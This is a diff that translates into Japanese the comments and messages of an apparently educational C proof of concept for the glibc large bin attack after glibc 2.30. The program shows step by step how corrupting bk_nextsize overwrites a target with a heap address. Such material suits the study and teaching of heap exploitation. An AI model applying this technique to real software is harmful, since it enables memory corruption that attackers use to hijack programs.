@@ -4,9 +4,9 @@
 
 /*
 
-A revisit to large bin attack for after glibc2.30
+glibc 2.30 以降向けの large bin attack の再検討
 
-Relevant code snippet :
+関連するコード断片:
 
 	if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
 		fwd = bck;
@@ -20,70 +20,70 @@ Relevant code snippet :
 */
 
 int main(){
-  /*Disable IO buffering to prevent stream from interfering with heap*/
+  /*ストリームがヒープに干渉するのを防ぐため、IO のバッファリングを無効にします*/
   setvbuf(stdin,NULL,_IONBF,0);
   setvbuf(stdout,NULL,_IONBF,0);
   setvbuf(stderr,NULL,_IONBF,0);
 
   printf("\n\n");
-  printf("Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n");
-  printf("Check 1 : \n");
+  printf("glibc 2.30 以降、large bin へのチャンク(chunk)挿入に、2つの新しいチェックが追加されました\n\n");
+  printf("チェック 1 : \n");
   printf(">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
   printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n");
-  printf("Check 2 : \n");
+  printf("チェック 2 : \n");
   printf(">    if (bck->fd != fwd)\n");
   printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n");
-  printf("This prevents the traditional large bin attack\n");
-  printf("However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n");
+  printf("これにより、従来の large bin attack は防がれます\n");
+  printf("しかし、large bin attack を発動できる経路が、まだ1つあります。PoC を以下に示します : \n\n");
   
   printf("====================================================================\n\n");
 
   size_t target = 0;
-  printf("Here is the target we want to overwrite (%p) : %lu\n\n",&target,target);
+  printf("上書きしたい標的はこれです (%p) : %lu\n\n",&target,target);
   size_t *p1 = malloc(0x428);
-  printf("First, we allocate a large chunk [p1] (%p)\n",p1-2);
+  printf("まず、大きなチャンク [p1] (%p) を割り当てます\n",p1-2);
   size_t *g1 = malloc(0x18);
-  printf("And another chunk to prevent consolidate\n");
+  printf("そして、統合(consolidate)を防ぐために、もう1つチャンクを割り当てます\n");
 
   printf("\n");
 
   size_t *p2 = malloc(0x418);
-  printf("We also allocate a second large chunk [p2]  (%p).\n",p2-2);
-  printf("This chunk should be smaller than [p1] and belong to the same large bin.\n");
+  printf("2つ目の大きなチャンク [p2]  (%p) も割り当てます。\n",p2-2);
+  printf("このチャンクは [p1] より小さく、同じ large bin に属している必要があります。\n");
   size_t *g2 = malloc(0x18);
-  printf("Once again, allocate a guard chunk to prevent consolidate\n");
+  printf("もう一度、統合を防ぐためにガードチャンク(guard chunk)を割り当てます\n");
 
   printf("\n");
 
   free(p1);
-  printf("Free the larger of the two --> [p1] (%p)\n",p1-2);
+  printf("2つのうち大きい方を free します --> [p1] (%p)\n",p1-2);
   size_t *g3 = malloc(0x438);
-  printf("Allocate a chunk larger than [p1] to insert [p1] into large bin\n");
+  printf("[p1] を large bin に挿入するために、[p1] より大きいチャンクを割り当てます\n");
 
   printf("\n");
 
   free(p2);
-  printf("Free the smaller of the two --> [p2] (%p)\n",p2-2);
-  printf("At this point, we have one chunk in large bin [p1] (%p),\n",p1-2);
-  printf("               and one chunk in unsorted bin [p2] (%p)\n",p2-2);
+  printf("2つのうち小さい方を free します --> [p2] (%p)\n",p2-2);
+  printf("この時点で、large bin に1つのチャンク [p1] (%p) があり、\n",p1-2);
+  printf("               unsorted bin に1つのチャンク [p2] (%p) があります\n",p2-2);
 
   printf("\n");
 
   p1[3] = (size_t)((&target)-4);
-  printf("Now modify the p1->bk_nextsize to [target-0x20] (%p)\n",(&target)-4);
+  printf("ここで、p1->bk_nextsize を [target-0x20] (%p) に書き換えます\n",(&target)-4);
 
   printf("\n");
 
   size_t *g4 = malloc(0x438);
-  printf("Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n", p2-2, p2-2);
-  printf("Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\n");
-  printf("  the modified p1->bk_nextsize does not trigger any error\n");
-  printf("Upon inserting [p2] (%p) into largebin, [p1](%p)->bk_nextsize->fd_nextsize is overwritten to address of [p2] (%p)\n", p2-2, p1-2, p2-2);
+  printf("最後に、[p2] (%p) を large bin に入れるために、[p2] より大きいチャンクをもう1つ割り当てます。入れられるのは [p2] (%p) です\n", p2-2, p2-2);
+  printf("新しく挿入されるチャンクが最小のものより小さい場合、glibc は chunk->bk_nextsize をチェックしないため、\n");
+  printf("  書き換えた p1->bk_nextsize はエラーを引き起こしません\n");
+  printf("[p2] (%p) を largebin に挿入すると、[p1](%p)->bk_nextsize->fd_nextsize が [p2] (%p) のアドレスで上書きされます\n", p2-2, p1-2, p2-2);
 
   printf("\n");
 
-  printf("In our case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n", p2-2, (void *)target);
-  printf("Target (%p) : %p\n",&target,(size_t*)target);
+  printf("今回の場合、target は [p2] (%p) のアドレスで上書きされました。[target] (%p)\n", p2-2, (void *)target);
+  printf("標的 (%p) : %p\n",&target,(size_t*)target);
 
   printf("\n");
   printf("====================================================================\n\n");
